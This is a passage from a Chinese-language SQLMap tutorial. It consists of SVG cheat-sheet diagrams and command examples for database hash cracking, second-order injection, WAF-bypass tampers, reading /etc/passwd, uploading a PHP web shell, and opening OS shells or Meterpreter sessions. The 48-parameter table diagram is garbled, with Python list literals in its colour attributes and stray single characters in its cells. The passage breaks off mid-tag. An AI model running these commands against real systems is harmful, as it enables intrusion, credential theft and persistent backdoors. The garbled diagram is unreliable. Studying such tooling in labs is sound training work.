<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss18" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss18g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s18dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss18g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss18dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-18 SQLMap 哈希自动破解 + 二阶注入（Second-order）两大高级场景</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">--passwords 自动识别 20+ 种哈希类型；二阶注入先写 A 页面再读 B 页面触发 payload</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#10b981"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">① --passwords 自动破解 DB 账号哈希</text>  <rect x="50" y="150" width="460" height="82" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="150" width="460" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="280.0" y="170" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 执行 --passwords</text>  <text x="280.0" y="200" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u URL --batch --passwords</text>  <text x="280.0" y="216" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">→ 自动 SELECT user,password FROM mysql.user / pg_shadow</text>  <rect x="50" y="240" width="460" height="82" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="240" width="460" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="280.0" y="260" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 识别哈希类型</text>  <text x="280.0" y="290" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MD5 / SHA1 / MySQL41 / Oracle11 / bcrypt / NTLM</text>  <text x="280.0" y="306" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap 自带指纹识别 26 种哈希格式</text>  <rect x="50" y="330" width="460" height="82" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="330" width="460" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="280.0" y="350" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 自动调用 John / Hashcat</text>  <text x="280.0" y="380" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">系统装了哪个就用哪个</text>  <text x="280.0" y="396" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">john --format=raw-md5 hashes.txt / hashcat -m 0 hashes.txt rockyou.txt</text>  <rect x="50" y="420" width="460" height="82" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="420" width="460" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="280.0" y="440" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">④ 结果自动写 CSV</text>  <text x="280.0" y="470" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">root@% : *6BB317B1... → root</text>  <text x="280.0" y="486" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">admin : e10adc... → 123456</text>  <text x="280.0" y="502" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">全部存在 ~/.sqlmap/output 下直接用</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#f59e0b"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#fcd34d" font-family="Microsoft YaHei,Arial">② 二阶注入（Second Order Injection）5 步工作流</text>  <rect x="570" y="150" width="460" height="58" rx="10" fill="#0f172a" stroke="#ef4444"/>  <text x="580" y="168" font-size="10.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">① 写阶段 A 页面</text>  <text x="580" y="182" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">POST /register username='admin'</text>  <text x="580" y="195" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">UNION SELECT password FROM users--</text>  <defs><marker id="a800208800220" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="800" y1="208" x2="800" y2="220" stroke="#60a5fa" stroke-width="2" marker-end="url(#a800208800220)" stroke-dasharray="3 2"/>  <rect x="570" y="220" width="460" height="58" rx="10" fill="#0f172a" stroke="#f59e0b"/>  <text x="580" y="238" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">② 读阶段 B 页面</text>  <text x="580" y="252" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">GET /myprofile?uid=123</text>  <text x="580" y="265" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">→ 代码 SELECT username FROM users</text>  <defs><marker id="a800278800290" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="800" y1="278" x2="800" y2="290" stroke="#60a5fa" stroke-width="2" marker-end="url(#a800278800290)" stroke-dasharray="3 2"/>  <rect x="570" y="290" width="460" height="58" rx="10" fill="#0f172a" stroke="#8b5cf6"/>  <text x="580" y="308" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ SQLMap --second-url</text>  <text x="580" y="322" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">-r reg.txt --second-url=&quot;http://t/myprofile?ui</text>  <text x="580" y="335" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">告诉 SQLMap：注入 Payload 在第 2 个 URL 回显</text>  <defs><marker id="a800348800360" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="800" y1="348" x2="800" y2="360" stroke="#60a5fa" stroke-width="2" marker-end="url(#a800348800360)" stroke-dasharray="3 2"/>  <rect x="570" y="360" width="460" height="58" rx="10" fill="#0f172a" stroke="#a855f7"/>  <text x="580" y="378" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ SQLMap --second-req</text>  <text x="580" y="392" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--second-req=read_profile_req.txt</text>  <text x="580" y="405" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">复杂 B 页面是 POST / 需要 Cookie 登录态</text>  <defs><marker id="a800418800430" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="800" y1="418" x2="800" y2="430" stroke="#60a5fa" stroke-width="2" marker-end="url(#a800418800430)" stroke-dasharray="3 2"/>  <rect x="570" y="430" width="460" height="58" rx="10" fill="#0f172a" stroke="#10b981"/>  <text x="580" y="448" font-size="10.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑤ 注入成功！</text>  <text x="580" y="462" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">显示位在 B 页面（myprofile）= U-based 出</text>  <text x="580" y="475" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">或 B 页面差异= Boolean 盲注</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 580" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss22" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss22g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s22dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss22g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss22dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-22 SQLMap 终极速查海报：9 张卡牌贴显示器=小白 1 周变老手</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">9 张卡覆盖：检测/枚举/实战 DB / 三种注入场景 / WAF / 高级 / 批量 / 坑点 / 4 大 DB</text>  <rect x="30" y="105" width="335" height="140" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="105" width="335" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="197.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 检测 4 条卡</text>  <text x="197.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="197.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-u URL -p id --batch --random-agent</text>  <text x="197.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-r req.txt (Burp抓包首选)</text>  <text x="197.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--level 5 --risk 3 (全量测)</text>  <text x="197.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--technique=BEUSTO 强制指定</text>  <rect x="375" y="105" width="335" height="140" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="375" y="105" width="335" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="542.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② 枚举 6 条递进卡</text>  <text x="542.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="542.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--dbs → 列表</text>  <text x="542.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tables (-D dbname) → 列表</text>  <text x="542.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--columns (-D -T table) → 列列</text>  <text x="542.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--dump (-C a,b) → 导出</text>  <text x="542.5" y="235" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--users/--passwords → 权限+哈希</text>  <text x="542.5" y="251" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--dump-all --exclude-sysdbs → 全库</text>  <rect x="720" y="105" width="335" height="140" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="105" width="335" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="887.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">③ WAF 绕过金 7 条</text>  <text x="887.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="887.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--random-agent</text>  <text x="887.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--delay 0.5 --timeout 10</text>  <text x="887.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--level 5 --risk 3</text>  <text x="887.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tamper between,space2comment,charencode,unmagicquotes,randomcase</text>  <text x="887.5" y="235" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--chunked + --hpp</text>  <text x="887.5" y="251" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--proxy-file=1000ip.txt / --tor</text>  <rect x="30" y="255" width="335" height="140" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="255" width="335" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="197.5" y="275" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 3 大非 GET 注入场景</text>  <text x="197.5" y="305" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="197.5" y="321" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">POST: -r login_post.txt -p username</text>  <text x="197.5" y="337" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Cookie: --cookie=&quot;u=1*&quot; --level 2</text>  <text x="197.5" y="353" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Header: -p &quot;User-Agent,X-Forwarded-For&quot;</text>  <text x="197.5" y="369" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--data=&quot;user=a&amp;p=b&quot; 直接 POST</text>  <text x="197.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">* 标记注入点位置，精准高效</text>  <text x="197.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">二阶注入：--second-url=B页面</text>  <rect x="375" y="255" width="335" height="140" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="375" y="255" width="335" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="542.5" y="275" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">⑤ 4 数据库核心差异</text>  <text x="542.5" y="305" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="542.5" y="321" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MySQL: LOAD_FILE / INTO OUTFILE / SLEEP</text>  <text x="542.5" y="337" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MSSQL: xp_cmdshell / WAITFOR DELAY</text>  <text x="542.5" y="353" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Oracle: UTL_FILE / DBMS_SCHEDULER / utl_http</text>  <text x="542.5" y="369" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Access: MSysObjects + 无报错</text>  <text x="542.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">注入时自动识别=省心</text>  <text x="542.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">手动写 Payload 时必查此卡</text>  <rect x="720" y="255" width="335" height="140" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="255" width="335" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="887.5" y="275" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑥ 高级功能（读写+shell）</text>  <text x="887.5" y="305" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="887.5" y="321" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--file-read=/etc/passwd 读任意文件</text>  <text x="887.5" y="337" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--file-write=./sh.php --file-dest=/var/www/html/sh</text>  <text x="887.5" y="353" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--os-cmd=&quot;whoami&quot; 单命令</text>  <text x="887.5" y="369" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--os-shell 交互 cmd/bash</text>  <text x="887.5" y="385" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--os-pwn 弹 MSF Meterpreter</text>  <text x="887.5" y="401" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--file-dest UDF 写 plugin 拿权限</text>  <rect x="30" y="405" width="335" height="140" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="405" width="335" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="197.5" y="425" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ Tamper 7 大分类首选</text>  <text x="197.5" y="455" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="197.5" y="471" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">空格→ space2comment / space2plus</text>  <text x="197.5" y="487" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">编码→ charencode / charunicodeencode</text>  <text x="197.5" y="503" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">逻辑→ between / greatest / equaltolike</text>  <text x="197.5" y="519" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">引号→ apostrophemask / unmagicquotes</text>  <text x="197.5" y="535" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">大小写→ randomcase / lowercase</text>  <text x="197.5" y="551" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">函数→ versionedmorekeywords / modsecversioned</text>  <rect x="375" y="405" width="335" height="140" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="375" y="405" width="335" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="542.5" y="425" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑧ 新手必踩 7 大天坑</text>  <text x="542.5" y="455" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="542.5" y="471" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">① 读缓存=加 --flush-session 重来</text>  <text x="542.5" y="487" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">② 数据乱码= --hex 导出</text>  <text x="542.5" y="503" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">③ 超时= --delay 放慢 + --timeout 调大</text>  <text x="542.5" y="519" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">④ 列不对= --prefix &quot;'&quot; --suffix &quot;-- -&quot;</text>  <text x="542.5" y="535" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">⑤ 注入点错= Burp 抓包 -r + -p 指定</text>  <text x="542.5" y="551" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">⑥ 大表卡死= --count + --start/--stop 分页</text>  <rect x="720" y="405" width="335" height="140" rx="10" fill="#0f172a" stroke="#dc2626" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="405" width="335" height="30" rx="10" fill="#dc2626" opacity="0.20"/>  <text x="887.5" y="425" text-anchor="middle" font-size="13" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">⑨ 企业级批量平台化</text>  <text x="887.5" y="455" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="887.5" y="471" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-m urls.txt 批量 N 条 URL</text>  <text x="887.5" y="487" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--output-dir=独立目录方便归档</text>  <text x="887.5" y="503" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--threads=8 并发加速</text>  <text x="887.5" y="519" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--ignore-result 遇错跳过不中断</text>  <text x="887.5" y="535" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--api -H 0.0.0.0 -p 8775</text>  <text x="887.5" y="551" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python SDK 对接 RESTful 平台</text>  <rect x="30" y="518" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="534" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">SQLMap 学习 3 阶段：①贴 9 卡背命令 → ②跑 10 个靶场(Sqli-labs/Pikachu/DVWA) → ③写 Tamper + 调 API 平台=出师</text>
</svg>

### 文件读写

**读取文件：**
```bash
sqlmap -u "http://target.com?id=1" --file-read="/etc/passwd"
```

**写入文件：**
```bash
sqlmap -u "http://target.com?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 命令执行

**操作系统命令：**
```bash
sqlmap -u "http://target.com?id=1" --os-shell
```

进入交互式系统Shell。

**执行SQL命令：**
```bash
sqlmap -u "http://target.com?id=1" --sql-shell
```

进入交互式SQL Shell。

### 密码破解

```bash
sqlmap -u "http://target.com?id=1" --passwords --batch
```

自动破解发现的密码哈希。

---

## 4.18 常用参数汇总

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 580" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss19" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss19g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s19dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss19g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss19dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-19 SQLMap 常用 48 参数终极速查表（5 大类 48 条=贴显示器）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">面试/实战/CTF，都不用翻 --hh，直接对表查=3 秒写出完整命令</text>  <rect x="30" y="100" width="1020" height="28" rx="8" fill="['-u / --url=http://x/?id=1', '--data="user=a&pwd=b"', '--cookie="PHPSESSID=xx"', '-H/--headers="X-API: 123"', '-r request.txt (Burp抓包)', '--method=PUT/POST/DELETE', '--proxy=http://127.0.0.1:7890', '--auth-type=BASIC/DIGEST/NTLM --auth-cred=u:p']" opacity="0.22"/>  <rect x="30" y="100" width="1020" height="28" rx="8" fill="none" stroke="['-u / --url=http://x/?id=1', '--data="user=a&pwd=b"', '--cookie="PHPSESSID=xx"', '-H/--headers="X-API: 123"', '-r request.txt (Burp抓包)', '--method=PUT/POST/DELETE', '--proxy=http://127.0.0.1:7890', '--auth-type=BASIC/DIGEST/NTLM --auth-cred=u:p']"/>  <text x="50" y="119" font-size="12.5" font-weight="800" fill="['-u / --url=http://x/?id=1', '--data="user=a&pwd=b"', '--cookie="PHPSESSID=xx"', '-H/--headers="X-API: 123"', '-r request.txt (Burp抓包)', '--method=PUT/POST/DELETE', '--proxy=http://127.0.0.1:7890', '--auth-type=BASIC/DIGEST/NTLM --auth-cred=u:p']" font-family="Microsoft YaHei,Arial">【1 目标连接参数 8 条】</text>  <rect x="40" y="134" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="149" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">#</text>  <rect x="292" y="134" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="149" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">0</text>  <rect x="544" y="134" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="149" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">e</text>  <rect x="796" y="134" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="802" y="149" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">a</text>  <rect x="40" y="160" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="175" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">5</text>  <rect x="292" y="160" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="175" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">e</text>  <rect x="544" y="160" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="175" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">9</text>  <rect x="30" y="192" width="1020" height="28" rx="8" fill="['-p id,username (测试参数)', '--skip=password (跳过参数)', '--technique=BEUSTO 6 选 1', '--dbms=MySQL 强行指定 DB', '--os=Windows/Linux 指定 OS', '--prefix="\'" --suffix="-- -"', '--string="登录成功" 真值标记', '--not-string="错误" 假值标记']" opacity="0.22"/>  <rect x="30" y="192" width="1020" height="28" rx="8" fill="none" stroke="['-p id,username (测试参数)', '--skip=password (跳过参数)', '--technique=BEUSTO 6 选 1', '--dbms=MySQL 强行指定 DB', '--os=Windows/Linux 指定 OS', '--prefix="\'" --suffix="-- -"', '--string="登录成功" 真值标记', '--not-string="错误" 假值标记']"/>  <text x="50" y="211" font-size="12.5" font-weight="800" fill="['-p id,username (测试参数)', '--skip=password (跳过参数)', '--technique=BEUSTO 6 选 1', '--dbms=MySQL 强行指定 DB', '--os=Windows/Linux 指定 OS', '--prefix="\'" --suffix="-- -"', '--string="登录成功" 真值标记', '--not-string="错误" 假值标记']" font-family="Microsoft YaHei,Arial">【2 注入点配置参数 8 条】</text>  <rect x="40" y="226" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="241" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">#</text>  <rect x="292" y="226" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="241" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">8</text>  <rect x="544" y="226" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="241" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">b</text>  <rect x="796" y="226" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="802" y="241" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">5</text>  <rect x="40" y="252" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="267" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">c</text>  <rect x="292" y="252" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="267" 